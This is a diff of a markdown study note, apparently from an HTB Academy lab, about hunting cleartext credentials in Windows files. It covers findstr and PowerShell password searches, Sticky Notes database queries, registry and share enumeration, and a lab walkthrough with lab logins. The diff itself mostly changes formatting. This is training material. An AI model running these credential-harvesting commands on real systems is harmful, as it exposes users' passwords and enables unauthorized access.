@@ -1,4 +1,4 @@
-# Other Files - Advanced Credential Hunting
+# 📁 Other Files
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔍 Manual File System Searches
 
 ### Basic String Searches
+
 ```cmd
 # Search file contents for password strings
 cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
@@ -22,6 +23,7 @@ stuff.txt:1:password: l#-x9r11_2_GL!
 ```
 
 ### PowerShell Search Methods
+
 ```powershell
 # PowerShell string search
 select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
@@ -31,6 +33,7 @@ Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction 
 ```
 
 ### File Extension Discovery
+
 ```cmd
 # Search for specific file extensions
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
@@ -45,6 +48,7 @@ where /R C:\ *.config
 ## 📝 Sticky Notes Database
 
 ### StickyNotes File Location
+
 ```cmd
 # StickyNotes SQLite database location:
 C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
@@ -56,6 +60,7 @@ plum.sqlite-wal     # Write-ahead log
 ```
 
 ### PowerShell SQLite Query
+
 ```powershell
 # Import PSSQLite module and query database
 Set-ExecutionPolicy Bypass -Scope Process
@@ -76,6 +81,7 @@ Text
 ```
 
 ### Alternative Analysis Methods
+
 ```bash
 # Copy SQLite files to attack box and use strings
 strings plum.sqlite-wal | grep -i password
@@ -88,6 +94,7 @@ strings plum.sqlite | grep -i root
 ## 📂 System and Application Files
 
 ### Windows System Files
+
 ```cmd
 # High-value system file locations:
 %SYSTEMDRIVE%\pagefile.sys                    # Virtual memory file
@@ -105,6 +112,7 @@ strings plum.sqlite | grep -i root
 ```
 
 ### User Profile Files
+
 ```cmd
 # User-specific credential storage:
 %USERPROFILE%\ntuser.dat                      # User registry hive
@@ -116,15 +124,17 @@ C:\Program Files\Windows PowerShell\*         # PowerShell modules/configs
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
-- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
-- **Objective**: Find cleartext password for bob_adm user
-- **Access Method**: xfreerdp
-- **Primary Method**: StickyNotes SQLite database analysis
+
+* **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
+* **Credentials**: `htb-student:HTB_@cademy_stdnt!`
+* **Objective**: Find cleartext password for bob\_adm user
+* **Access Method**: xfreerdp
+* **Primary Method**: StickyNotes SQLite database analysis
 
 ### Detailed Walkthrough
 
 #### 1. Connect via RDP
+
 ```bash
 # Connect to target using xfreerdp
 xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!
@@ -137,12 +147,14 @@ xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 #### 2. Navigate to PSSQLite Tools Directory
+
 ```powershell
 # Open PowerShell and navigate to tools
 cd C:\Tools\PSSQLite\
 ```
 
 #### 3. Set PowerShell Execution Policy
+
 ```powershell
 # Bypass execution policy for current process
 Set-ExecutionPolicy Bypass -scope Process
@@ -157,6 +169,7 @@ https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the executi
 ```
 
 #### 4. Import PSSQLite Module
+
 ```powershell
 # Import the PSSQLite module
 Import-Module .\PSSQLite.psd1
@@ -170,6 +183,7 @@ Run only scripts that you trust. While scripts from the internet can be useful, 
 ```
 
 #### 5. Query StickyNotes Database
+
 ```powershell
 # Set database path
 $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
@@ -188,7 +202,8 @@ Text
 \id=c73f29c3-64f8-4cfc-9421-f65c34b4c00e [bob_adm password should be here]
 ```
 
-#### 6. Extract bob_adm Password
+#### 6. Extract bob\_adm Password
+
 ```powershell
 # Look for bob_adm credentials in the query results
 # Password should be visible in one of the Note entries
@@ -198,6 +213,7 @@ Text
 ## 🌐 Network Share Drive Hunting
 
 ### Share Enumeration
+
 ```cmd
 # Common network share credential hunting:
 net view \\<server>
@@ -209,6 +225,7 @@ Snaffler.exe -s <domain-controller> -d <domain>
 ```
 
 ### High-Value Share Locations
+
 ```cmd
 # Common share paths with credentials:
 \\<server>\users\<username>\                  # Personal folders
@@ -221,6 +238,7 @@ Snaffler.exe -s <domain-controller> -d <domain>
 ## 🛠️ Advanced Search Techniques
 
 ### Recursive Pattern Matching
+
 ```powershell
 # Advanced PowerShell search
 Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | 
@@ -234,6 +252,7 @@ Select-String -Pattern "bob_adm|administrator|admin" -ErrorAction SilentlyContin
 ```
 
 ### Binary and Database Files
+
 ```cmd
 # Extract strings from binary files
 strings.exe <binary_file> | findstr /i password
@@ -246,6 +265,7 @@ reg query HKCU /f password /t REG_SZ /s
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Bulk file access patterns
@@ -256,6 +276,7 @@ reg query HKCU /f password /t REG_SZ /s
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security practices:
 - Regular cleanup of backup files
@@ -275,6 +296,6 @@ reg query HKCU /f password /t REG_SZ /s
 5. **Multiple file types** should be examined systematically
 6. **PowerShell provides powerful** search capabilities for credential hunting
 
----
+***
 
-*Advanced file system credential hunting extends beyond standard configuration files to reveal credentials in unexpected locations throughout Windows systems.* 
+_Advanced file system credential hunting extends beyond standard configuration files to reveal credentials in unexpected locations throughout Windows systems._
